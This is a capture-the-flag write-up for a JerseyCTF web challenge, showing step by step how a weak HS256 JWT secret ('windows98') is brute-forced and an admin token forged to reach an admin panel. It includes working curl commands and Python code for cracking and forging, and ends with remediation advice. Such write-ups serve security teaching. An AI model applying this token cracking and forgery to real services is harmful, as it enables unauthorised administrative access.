# CTF Writeup — My Favorite OS

**Event:** JerseyCTF  
**Category:** Web  
**Difficulty:** Medium  
**Flag:** `jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}`

---

## Challenge Description

> I love old operating systems, especially Windows 98! I had to disable some old administrator legacy endpoints…or did I?

**URL:** `http://my-favorite-os.aws.jerseyctf.com`

---

## Reconnaissance

### Step 1 — Identify the Application

The target is a Windows 98-styled web terminal. Inspecting the page source reveals:

- A backend API at `http://my-favorite-os.aws.jerseyctf.com`
- Client-side JWT parsing logic (`parseJWT`) — signals JWT-based auth
- A `help` command showing example usage including:
  ```
  POST /api/v1/login username=guest password=guest
  GET /admin/panel -H "Authorization: Bearer [TOKEN]"
  ```

### Step 2 — Login as Guest

```bash
curl -si http://my-favorite-os.aws.jerseyctf.com/api/v1/login \
  -X POST -d "username=guest&password=guest"
```

Response:
```json
{
  "message": "Login successful",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjU0MDA2Nn0.09J9x-vz7GD0K_c54RID_N5Sb0xc3FAY25m2GFV4_b4"
}
```

### Step 3 — Decode the JWT

Decoding the token reveals:

```json
Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "user": "guest", "role": "user", "iat": 1776540066 }
```

The `role` field is `"user"` — we need `"admin"` to access `/admin/panel`.

### Step 4 — Test Access to Admin Panel

```bash
curl -si http://my-favorite-os.aws.jerseyctf.com/admin/panel \
  -H "Authorization: Bearer <guest_token>"
# → 403 Forbidden (role check failed)
```

Trying `alg:none` attack:
```bash
# → 403: "Unsupported algorithm: none"
```

Server rejects `alg:none` — signature must be valid HS256.

### Step 5 — Discover Legacy Endpoints

```bash
curl -si http://my-favorite-os.aws.jerseyctf.com/api/v1/
```

Response:
```json
{
  "version": "1.0",
  "endpoints": ["/api/v1/login"],
  "note": "Legacy v0 retired on 03/25/2026"
}
```

This confirms a `/api/v0/` path existed — consistent with the challenge hint about "legacy endpoints."

---

## Exploitation

### Step 6 — Crack the JWT Secret

Since the token uses HS256, the signature is an HMAC-SHA256 of the header + payload using a server-side secret. If the secret is weak, it can be brute-forced.

```python
import hmac, hashlib, base64

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTc3NjU0MDA2Nn0.09J9x-vz7GD0K_c54RID_N5Sb0xc3FAY25m2GFV4_b4"
header_payload = '.'.join(token.split('.')[:2]).encode()
expected_sig   = token.split('.')[2]

wordlist = ['secret','password','admin','clippy','windows98', ...]

for word in wordlist:
    sig = base64.urlsafe_b64encode(
        hmac.new(word.encode(), header_payload, hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == expected_sig:
        print(f"SECRET: {word}")
        break
```

Result:
```
[+] SECRET FOUND: 'windows98'
```

The JWT secret is `windows98` — matching the Windows 98 theme of the challenge.

### Step 7 — Forge Admin Token

With the secret known, a new JWT is crafted with `role: "admin"`:

```python
import hmac, hashlib, base64, json

SECRET  = b'windows98'
header  = base64url(json.dumps({"alg":"HS256","typ":"JWT"}))
payload = base64url(json.dumps({"user":"admin","role":"admin","iat":1776540066}))
sig     = base64url(hmac.new(SECRET, f"{header}.{payload}".encode(), hashlib.sha256).digest())

admin_token = f"{header}.{payload}.{sig}"
```

Forged token:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NzY1NDAwNjZ9.b09_RbxR1N7BZqpLYO_ulSS86gBXEQdrYVnlYxWQkgI
```

### Step 8 — Access Admin Panel

```bash
curl -si http://my-favorite-os.aws.jerseyctf.com/admin/panel \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NzY1NDAwNjZ9.b09_RbxR1N7BZqpLYO_ulSS86gBXEQdrYVnlYxWQkgI"
```

Response:
```html
HTTP/1.1 200 OK

<h1> ADMIN PANEL</h1>
<p>Welcome, admin!</p>
<b>jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}</b>
```

---

## Flag

```
jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}
```

---

## Vulnerability Summary

| # | Vulnerability | Detail |
|---|---|---|
| 1 | **Weak JWT Secret** | HMAC secret `windows98` is a guessable themed keyword, crackable with a small wordlist |
| 2 | **Role Stored in JWT Payload** | Authorization role embedded in client-visible (and forgeable) token payload |
| 3 | **No Server-Side Role Validation** | Server trusts the `role` field in the token instead of looking up the user's role from a database |

---

## Remediation

1. **Use a strong, random JWT secret** — minimum 256 bits of entropy, not a human-readable word
2. **Never store authorization roles in the token payload** — look up the user's role from the database on every request using only the user ID from the token
3. **Rotate secrets regularly** — and immediately if a breach is suspected
4. **Consider asymmetric JWT (RS256)** — the private key signs, the public key verifies; a leaked public key cannot be used to forge tokens

---

## Tools Used

- `curl` — HTTP requests and endpoint discovery
- Python `hmac` + `hashlib` — JWT signature brute-force and token forging
- Manual JWT decoding (base64url)

---

## Attack Flow

```
Login as guest (username=guest, password=guest)
        │
        ▼
Receive JWT: { user: "guest", role: "user" }
        │
        ▼
Attempt /admin/panel → 403 (wrong role)
        │
        ▼
Attempt alg:none → 403 (unsupported algorithm)
        │
        ▼
Brute-force HS256 secret → "windows98"
        │
        ▼
Forge JWT: { user: "admin", role: "admin" } signed with "windows98"
        │
        ▼
GET /admin/panel with forged token → 200 OK
        │
        ▼
jctf{w1nd0ws98_1s_th3_b3st_0s_3v3r_937cn2}
```
